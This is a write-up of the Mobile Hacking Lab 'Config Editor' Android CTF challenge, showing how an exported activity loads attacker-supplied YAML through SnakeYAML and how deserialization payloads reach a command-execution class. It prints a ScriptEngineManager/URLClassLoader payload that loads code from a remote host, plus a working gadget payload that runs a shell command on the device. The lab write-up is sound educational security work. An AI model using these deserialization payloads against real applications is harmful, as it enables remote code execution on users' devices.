---
date: '2025-04-09T15:35:42+08:00'
title: 'MHL Config Editor'
tags:
    - MHL
    - Android CTF
---

## Challenge Description

> Welcome to the Config Editor Challenge! In this lab, you'll dive into a realistic situation involving vulnerabilities in a widely-used third-party library. Your objective is to exploit a library-induced vulnerability to achieve RCE on an Android application.
>
> [configeditor.apk](static/configeditor.apk)

## Solution

As usual, I started out by performing static analysis to read the code.

### Static Analysis

I started by looking into the `AndroidManifest.xml`.

```xml
<activity
    android:name="com.mobilehackinglab.configeditor.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/yaml"/>
    </intent-filter>
</activity>
```

There's only one activity and it has a intent filter which accept URI parameter.

```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
        CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.configeditor.MainActivity$handleIntent$1
            {
                super(1);
            }

            @Override // kotlin.jvm.functions.Function1
            public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                invoke2(uri);
                return Unit.INSTANCE;
            }

            /* renamed from: invoke, reason: avoid collision after fix types in other method */
            public final void invoke2(Uri uri) {
                MainActivity mainActivity = MainActivity.this;
                Intrinsics.checkNotNull(uri);
                mainActivity.loadYaml(uri);
            }
        }));
    }
}
```

Moving on to `MainActivity` code, there's a `handleIndent` function where it will receive incoming intent and execute several function such as `CopyUtil.INSTANCE.copyFileFromUri` and `loadYaml`. 

```java
public final void loadYaml(Uri uri) {
    try {
        ParcelFileDescriptor openFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
        try {
            ParcelFileDescriptor parcelFileDescriptor = openFileDescriptor;
            FileInputStream inputStream = new FileInputStream(parcelFileDescriptor != null ? parcelFileDescriptor.getFileDescriptor() : null);
            DumperOptions $this$loadYaml_u24lambda_u249_u24lambda_u248 = new DumperOptions();
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setIndent(2);
            $this$loadYaml_u24lambda_u249_u24lambda_u248.setPrettyFlow(true);
            Yaml yaml = new Yaml($this$loadYaml_u24lambda_u249_u24lambda_u248);
            Object deserializedData = yaml.load(inputStream);
            String serializedData = yaml.dump(deserializedData);
            ActivityMainBinding activityMainBinding = this.binding;
            if (activityMainBinding == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding = null;
            }
            activityMainBinding.contentArea.setText(serializedData);
            Unit unit = Unit.INSTANCE;
            Closeable.closeFinally(openFileDescriptor, null);
        } finally {
        }
    } catch (Exception e) {
        Log.e(TAG, "Error loading YAML: " + uri, e);
    }
}
```

Looking into the `loadYaml` function, it seems to be something related to YAML deserialization where it will perform `load` and `dump` function.

```java
import org.yaml.snakeyaml.Yaml;
```

After looking into the imports, I noticed that the YAML is using `snakeyaml`. I then googled it and found some useful information such as [this](https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/) and [this](https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2) which it is possible to gain RCE. 

```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```

Another thing is that there is a class and function `LegacyCommandUtil` where it is possible to execute command. I believe this will be used together with the YAML deserialization with `SnakeYAML`. Time to perform dynamic analysis to see how it actually works.

### Dynamic Analysis

I started by playing around with the application and provide some intent to meet the criteria.

```powershell
PS C:\> adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://192.168.68.107:8001/test.yaml"
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity }
```

![alt text](img/index.png#center)

From what I understand, this process basically just deserialize it using `yaml.load` and serialize back it using `yaml.dump`. Based on [this article](https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/), I tried to use the payload and see if its work.

```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://192.168.68.107:8001/yeet"] ]] ]
```

```powershell
PS C:\> adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://192.168.68.107:8001/test.yaml"
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity }
```

![alt text](img/index-1.png#center)

It seem's like something is wrong and the POC provided did not work. I then tried to understand how the YAML deserialization works and see what I could do. After understanding it, I noticed that it has something to do with classes and the `LegacyCommandUtil` has classes in it. I then craft a payload and try to execute the `LegacyCommandUtil` function.

```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /sdcard/Documents/configeditorhacked.txt"]
```

```powershell
PS C:\> adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://192.168.68.107:8001/hacked.yaml"
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.68.107:8001/... cmp=com.mobilehackinglab.configeditor/.MainActivity }
```

![alt text](img/index-2.png#center)

After a few attempt, I tried the yaml payload and it managed to rendered back in the page. I then checked it my RCE is successful or not.

```bash
beryllium:/sdcard/Documents # ls -la
total 0
-rw-rw---- 1 root everybody 0 2025-04-09 17:07 configeditorhacked.txt
```

This proof that the YAML deserialization executed the `LegacyCommandUtil` function and I managed to create a file in specific directory.

## Things I learned from this challenge

- YAML deserialization
- SnakeYAML CVE 